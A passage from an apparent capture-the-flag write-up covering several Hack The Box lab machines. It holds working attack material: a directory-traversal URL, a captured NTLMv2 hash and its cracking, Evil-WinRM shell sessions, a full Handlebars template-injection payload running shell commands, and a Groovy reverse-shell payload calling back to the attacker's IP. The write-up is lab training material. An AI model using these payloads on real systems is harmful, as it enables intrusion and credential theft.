===============================================================

```
In scanning the directories, one page seems to be promising; ```/dashboard```"

![Screenshot_2022-07-22_21_03_34](https://user-images.githubusercontent.com/59018247/180584449-a25f0523-85e0-4b1c-8d62-1ca25db0d191.png)

Since we aquired a user name and password list from the ftp server, we can try running the combinations through to find a successful credential. If we recall earlier, the user/password list was as follows:

| # | 	Username 	| Password |
| :-----------: | :-----------: | :-----------: |
| 1 | 	aron   |    	root | 
| 2 | 	pwnmeow   |    	Supersecretpassword1 | 
| 3 | 	egotisticalsw   |    	@BaASD&9032123sADS | 
| 4 | 	admin   |    	rKXM59ESxesUFHAd  | 

In trying all of the options, the 4th option appears to be valid credentials!

![Screenshot_2022-07-22_21_08_56](https://user-images.githubusercontent.com/59018247/180584615-fe75f0ba-e40d-477e-a34f-0cc83c41de3f.png)

We have finally aquired our ninth flag inside the dashboard.

## Conclusions - Level 3 Crocodile

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	Insecure FTP Server   |    	X |  |  |  |

Using nmap, we were able to discover the host had an FTP server port 21, and a web server on port 80. We were then able to get a username and password list from the FTP server. Armed with that information, we then used gobuster to find the admin login page to finally crack the authenticated login.

[Table of Contents](#table-of-contents) 

## Level 4: Responder

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.4.31 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.4.31 

PING 10.129.4.31 (10.129.4.31) 56(84) bytes of data.
64 bytes from 10.129.4.31: icmp_seq=1 ttl=127 time=25.8 ms
64 bytes from 10.129.4.31: icmp_seq=2 ttl=127 time=10.7 ms
64 bytes from 10.129.4.31: icmp_seq=3 ttl=127 time=8.93 ms
64 bytes from 10.129.4.31: icmp_seq=4 ttl=127 time=55.2 ms

--- 10.129.4.31 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 8.932/25.176/55.191/18.532 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.4.31
 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-23 12:39 EDT
Nmap scan report for 10.129.4.31
Host is up (0.021s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.46 seconds

```

Our scan reveals mainly two ports of interest to dissect; port 80 (Web Server) and port 5985 (WinRM). 

The first thing we can try is to browse the website for clues.

![Screenshot_2022-07-23_12_43_17](https://user-images.githubusercontent.com/59018247/180614879-1f3f673e-eb14-435d-a8b2-15a40a8cf501.png)


We can see here that we were unable to establish a connection, however in the URL we have a name shown as ```unika.htb```. The website has redirected the website to this address, however the host does not understand how to connect the dots.

We can modify the etc/hosts file to resolve this issue:

![Screenshot_2022-07-23_12_48_33](https://user-images.githubusercontent.com/59018247/180614872-261bec8b-2574-41c3-b159-f707f11623a0.png)

After making the changes, we can now view the proper website:

![Screenshot_2022-07-23_12_51_55](https://user-images.githubusercontent.com/59018247/180614934-0d358e4f-55ef-45dd-b31a-62d0a0551071.png)

In snooping around on the different pages, we notice that on the language versions of the site the url is showing a page parameter:

```
http://unika.htb/index.php?page=french.html
```

This may indicate it is possible to traverse the directory of the webserver for exploitation. 

Since nmap revealed we are attacking a Windows machine, we can try to access a common file that exists: 

```
WINDOWS\System32\drivers\etc\hosts
```

Modifying the url to access this file, we can try the following URL:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

Refreshing the webpage, we have successfully revealed the windows host file:

![Screenshot_2022-07-23_13_00_17](https://user-images.githubusercontent.com/59018247/180615211-7307b681-512d-426e-ae9a-510f6769b0e8.png)

We can now take this one step further and exploit the NTLM authentication using a tool called responder.

```
└─$ sudo responder -I tun0          
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.87]
    Responder IPv6             [dead:beef:2::1055]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LC8NZWB450S]
    Responder Domain Name      [W4NH.LOCAL]
    Responder DCE-RPC Port     [49336]

[+] Listening for events...                                                                                                           
```
Now that responder is ready, we can try access any file by exploiting the page parameter. We can try:

```
http://unika.htb/?page=//{Our IP Address}/test
```
![Screenshot_2022-07-23_14_44_41](https://user-images.githubusercontent.com/59018247/180618805-7a30ee7e-b45f-4874-a0af-7cf7a4c16d3c.png)

It appears to be a success! In our terminal, Responder captured the following credentials:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.4.31
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:5420717e47baee4c:5BC65B6C5DBAFACCC013D4E153364A24:010100000000000000F02A29A29ED8012DED954E423C776E0000000002000800570034004E00480001001E00570049004E002D004C00430038004E005A0057004200340035003000530004003400570049004E002D004C00430038004E005A005700420034003500300053002E00570034004E0048002E004C004F00430041004C0003001400570034004E0048002E004C004F00430041004C0005001400570034004E0048002E004C004F00430041004C000700080000F02A29A29ED80106000400020000000800300030000000000000000100000000200000F5704D73064BBD67A5F54D3D2A95D86C25036B6515DB9B3A27E75D60FDA94EBF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380037000000000000000000     
```

We now have a username and hash. We can try cracking the hash using the popular tool John the Ripper.

```
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-07-23 14:50) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

This attack was successful and we now aquired the credentials of:

```
USERNAME: Administrator
PASSWORD: badmitton 
```

If we recall earlier, port 5985 was open as for WinRM. We can investigate that port next to see if the information we gathered thus far was useful.

Since we are using Kali Linux, we can use a tool called Evil-WinRM to connect to the WinRM service (being a native windows application).

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.4.31 -u administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                     

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Our username and password were accepted! We can now browse the filesystem.  
                
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/11/2020   7:19 AM                3D Objects
d-r---        10/11/2020   7:19 AM                Contacts
d-r---          3/9/2022   5:34 PM                Desktop
d-r---         3/10/2022   4:51 AM                Documents
d-r---        10/11/2020   7:19 AM                Downloads
d-r---        10/11/2020   7:19 AM                Favorites
d-r---        10/11/2020   7:19 AM                Links
d-r---        10/11/2020   7:19 AM                Music
d-r---         4/27/2020   6:01 AM                OneDrive
d-r---        10/11/2020   7:19 AM                Pictures
d-r---        10/11/2020   7:19 AM                Saved Games
d-r---        10/11/2020   7:19 AM                Searches
d-r---        10/11/2020   7:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Downloads
*Evil-WinRM* PS C:\Users\Administrator\Downloads> dir
*Evil-WinRM* PS C:\Users\Administrator\Downloads> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 :-----------:--         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> 
```
After some directory hoping, we finally found the tenth flag located at ``` Directory: C:\Users\mike\Desktop```!

## Conclusions - Level 4 Responder

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	Responder   |    	Used as a  LLMNR, NBT-NS and MDNS poisoner | 
| 3 | 	John The Ripper   |    	Used to password/hash cracking | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	File Inclusion Vulnerability  |    	X |  |  |  |
| 2 | 	WinRM Port Exposed Externally  |    	 | X |  |  |

Using nmap, we were able to discover the host had WinRM open on port 5985, and a web server on port 80. We were then able to get a username and password for the WinRM authentication by exploiting the file inclusion vulnerability from the webserver. We then used John the Ripper to crack the password hash from the Responder output.

[Table of Contents](#table-of-contents) 

## Level 5: Ignition

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.5.68 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.5.68

PING 10.129.5.68 (10.129.5.68) 56(84) bytes of data.
64 bytes from 10.129.5.68: icmp_seq=1 ttl=63 time=6.46 ms
64 bytes from 10.129.5.68: icmp_seq=2 ttl=63 time=12.5 ms
64 bytes from 10.129.5.68: icmp_seq=3 ttl=63 time=11.6 ms
64 bytes from 10.129.5.68: icmp_seq=4 ttl=63 time=9.01 ms

--- 10.129.5.68 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 6.456/9.884/12.504/2.356 ms


```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.5.68

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 21:14 EDT
Nmap scan report for 10.129.5.68
Host is up (0.0075s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/
|_http-server-header: nginx/1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.67 seconds


```

Our scan reveals one port of interest to dissect; port 80 (Web Server). 

The first thing we can try is to browse the website for clues.

![Screenshot_2022-07-24_21_17_14](https://user-images.githubusercontent.com/59018247/180675441-c6d6adef-a0fe-4f70-b4db-855261b784d1.png)


We can see here that we were unable to establish a connection, however in the URL we have a name shown as ```https://ignition.htb/```. The website has redirected the website to this address, however the host does not understand how to connect the dots.

We can modify the etc/hosts file to resolve this issue:

![Screenshot_2022-07-24_21_21_48](https://user-images.githubusercontent.com/59018247/180675802-e956590f-ddeb-43c0-a9f6-e779534c24d0.png)


After making the changes, we can now view the proper website:

![Screenshot_2022-07-24_21_24_49](https://user-images.githubusercontent.com/59018247/180676009-e3ed43c7-46c1-4fcb-9cb6-8db16d687c9c.png)



In snooping around, we can first use gobuster to see if there are any hidden pages:

```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u ignition.htb

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ignition.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/24 21:28:41 Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 200) [Size: 25803]
/admin                (Status: 200) [Size: 7095] 
/catalog              (Status: 302) [Size: 0] [--> http://ignition.htb/]
/checkout             (Status: 302) [Size: 0] [--> http://ignition.htb/checkout/cart/]
/cms                  (Status: 200) [Size: 25817]                                     
/contact              (Status: 200) [Size: 28673]                                     
Progress: 1308 / 4615 (28.34%)                                                       ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/07/24 21:32:50 Finished
===============================================================

```
We find an admin page, asking for a username and password:

![Screenshot_2022-07-24_21_33_32](https://user-images.githubusercontent.com/59018247/180676670-bd39d2d6-2aaa-4b11-a03a-deddd400c75c.png)

According to the web error messages, we can see that they force the user to add numbers to their passwords for extra security. This is a good opportunity to try some common passwords and adding a basic number scheme to them:

| # | 	Username 	| Password |
| :-----------: | :-----------: | :-----------: |
| 1 | 	admin   |    	admin123   | 
| 2 | 	admin  |    	administrator123   | 
| 3 | 	admin 	 |  user123       | 
| 4 | 	admin 	 |  test123       | 
| 5 | 	admin |  	ubuntu123    | 
| 6 | 	admin |  	qwerty123    | 

In trying all of these combinations, we find that #6 finally grants us access!

![Screenshot_2022-07-24_21_41_00](https://user-images.githubusercontent.com/59018247/180677303-aac01574-0e46-4769-bf51-55e972bbfe3d.png)


We can now gather out eleventh flag located at in the logon dashboard!

## Conclusions - Level 5 Ignition

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host had a web server open on port 80. We then used gobuster as a means for finding an administration page hidden in its directory. Finally, we guess a common sequence of usernames and passwords with trailing numbers that allowed us access to the dashboard.

[Table of Contents](#table-of-contents) 

## Level 6: Bike

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.97.64 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.97.64

PING 10.129.97.64 (10.129.97.64) 56(84) bytes of data.
64 bytes from 10.129.97.64: icmp_seq=1 ttl=63 time=11.7 ms
64 bytes from 10.129.97.64: icmp_seq=2 ttl=63 time=10.3 ms
64 bytes from 10.129.97.64: icmp_seq=3 ttl=63 time=8.72 ms
64 bytes from 10.129.97.64: icmp_seq=4 ttl=63 time=6.81 ms

--- 10.129.97.64 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 6.806/9.384/11.668/1.819 ms


```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.97.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 16:59 EDT
Nmap scan report for 10.129.97.64
Host is up (0.0070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds

```

Our scan reveals two ports of interest; port 80 (Web Server) and port 22 (SSH Remote). 

The first thing we can try is to browse the website for clues.

![Screenshot_2022-07-25_17_00_56](https://user-images.githubusercontent.com/59018247/180873428-8b056ea7-bc7e-4d33-960d-0a6f48e2af7e.png)

We can see here that this is a very basic website that contains one input field for email submission. 

We also see that the backend server is running node.js and using the express framework from the Wappalyzer extension.

![Screenshot_2022-07-25_17_03_08](https://user-images.githubusercontent.com/59018247/180873805-9d1df87d-e57a-49eb-bf66-e007e4b299c5.png)
 
One clue given is to submit the text: "{{7*7}}" into the email form and hit submit.

Doing so reveals the following page:

![Screenshot_2022-07-25_17_06_03](https://user-images.githubusercontent.com/59018247/180874042-99976909-bf1a-47dc-9a55-68aacd3e654f.png)

The takeaway from this reveals two important pieces of information.

 1. 7*7 did not get muliplied out as an integer
 2. We can see from the error message that the backend is utilizing the handlebars library
 
In doing some recon, we discover that this is vulnerable to an SSTI(Server Side Template Injection). According to [books.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection):

> A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

> Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

Further browsing the site shows quite a few potential exploits used against Node.js backend libraries. One in particular interest, is the exploit specifically for handlebars:

```

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```

We can try passing this URL encoded text into the form submission to see if we cab perform an SSTI:

 ![Screenshot_2022-07-25_17_21_56](https://user-images.githubusercontent.com/59018247/180876299-2f2d8295-dab6-495d-8020-973de67a7238.png)
 
 ![Screenshot_2022-07-25_17_22_56](https://user-images.githubusercontent.com/59018247/180876439-698a0937-6732-4b76-b410-d943dc6841b5.png)

We get an error on the backend about require not being defined:

```
 
{{this.push "return require('child_process').exec('whoami');"}}

```


With some knowledge of Node.js, require is not in the global scope and is not accessible here. We can try substituing is for another object that can be passed locally. 

In this case, we can try ```process```:

```

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```

![Screenshot_2022-07-25_17_35_51](https://user-images.githubusercontent.com/59018247/180878118-2f12deb4-3c90-44d7-8dda-07149366a2dc.png)


We can see here we no longer recieved an error, and displayed the text 

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object Object]
```
We are getting close here and can try to appended require with process to override it:

![Screenshot_2022-07-25_18_03_44](https://user-images.githubusercontent.com/59018247/180881599-24c0a10e-d4ff-4621-92a7-751491f74cab.png)

Passing the following command shows that we are root!

```
       We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            root
```
We can now append execSync to start pass commands on the server directly:

```
{{this.push "return process.mainModule.require('child_process').execSync('ls');"}}
```

![Screenshot_2022-07-25_18_06_41](https://user-images.githubusercontent.com/59018247/180881934-adf32cad-af11-4d05-bb72-b14e9bb09d93.png)


```
index.js
node_modules
package.json
package-lock.json
public
routes
views
```
Executing that command exposed the server directory. We can now poke around to see what we find:



In snooping around, we can first use gobuster to see if there are any hidden pages:

```
{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
```
If we browse the root directory we find:

```
Backend
flag.txt
snap
```

```
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
```
Therefore, we now execute out final command to grab our twelfth flag!

![Screenshot_2022-07-25_18_13_18](https://user-images.githubusercontent.com/59018247/180882887-61b25f31-806d-4150-951d-92319038bbe6.png)

## Conclusions - Level 6 Bike

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	Burp Suite   |    	The class-leading vulnerability scanning, penetration testing, and web app security platform.| 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Server Side Template Injection   |    	X |  |  |  |

Using nmap, we were able to discover the host had a web server open on port 80. We then analyzed the input field, and realized it was open to a server side template injection exploit. Finally using Burpe Suite, we were able to inject the correct payload for the handlebar library vulnerability that gave us server side execution.

[Table of Contents](#table-of-contents) 

## Level 7: Pennyworth

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.6.198 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.6.198  
                         
PING 10.129.6.198 (10.129.6.198) 56(84) bytes of data.
64 bytes from 10.129.6.198: icmp_seq=1 ttl=63 time=8.47 ms
64 bytes from 10.129.6.198: icmp_seq=2 ttl=63 time=7.36 ms
64 bytes from 10.129.6.198: icmp_seq=3 ttl=63 time=13.5 ms
64 bytes from 10.129.6.198: icmp_seq=4 ttl=63 time=11.6 ms
^C
--- 10.129.6.198 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 7.356/10.223/13.451/2.432 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.6.198

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 14:43 EDT
Nmap scan report for 10.129.6.198
Host is up (0.0098s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds

```

Our scan reveals one port of interest; port 8080 (Web Server).

The first thing we can try is to browse the website for clues.

![Screenshot_2022-07-26_15_45_24](https://user-images.githubusercontent.com/59018247/181098868-adeb8363-a204-4427-a1a2-b3a4c7f8c304.png)


We can see here that this is a very basic website that contains a login for Jenkins. A quick google search on Jenkins reveals:

> The leading open source automation server, Jenkins provides hundreds of plugins to support building, deploying and automating any project. 

> Jenkins offers a simple way to set up a continuous integration or continuous delivery (CI/CD) environment for almost any combination of languages and source code repositories using pipelines, as well as automating other routine development tasks. While Jenkins doesn’t eliminate the need to create scripts for individual steps, it does give you a faster and more robust way to integrate your entire chain of build, test, and deployment tools than you can easily build yourself.

Another google search reveals that if left unconfigured, a default username and password combination is root/password:


![Screenshot_2022-07-26_15_50_39](https://user-images.githubusercontent.com/59018247/181099766-49f41172-f2f4-4654-b6c8-5df1cde486de.png)

Using that combination grants us internal access to the dashboard. In doing some snooping we notice that that Jenkins version is 2.289.1. 

In doing some more online searching, we find it is possible to perform a [reverse shell exploit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) while given access to the console!

Heading to the console page:

![Screenshot_2022-07-26_15_54_14](https://user-images.githubusercontent.com/59018247/181100382-ebe35744-513e-4fec-98e6-a168cfee8218.png)

We can try the reverse shell payload:

```
String host="{ip address}";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

First we need to run netcat in listening mode:

```
└─$ nc -lvnp 4242

listening on [any] 4242 ...

```
Then while executing the groovy script, we unexpectadly recieve a large error message:


![Screenshot_2022-07-26_15_58_29](https://user-images.githubusercontent.com/59018247/181101248-109a9f1b-a26f-4790-954d-fba7f897de3f.png)

We can see the main error:

```
Cannot run program "cmd.exe": error=2, No such file or directory
```

If the machine does not understand "cmd.exe", we can conclude here that we are not dealing with a Windows server. Therefore, we can modify the payload we have to instead work with linux:

```
String host="10.10.14.112";
int port=4242;
String cmd="/bin/bash";
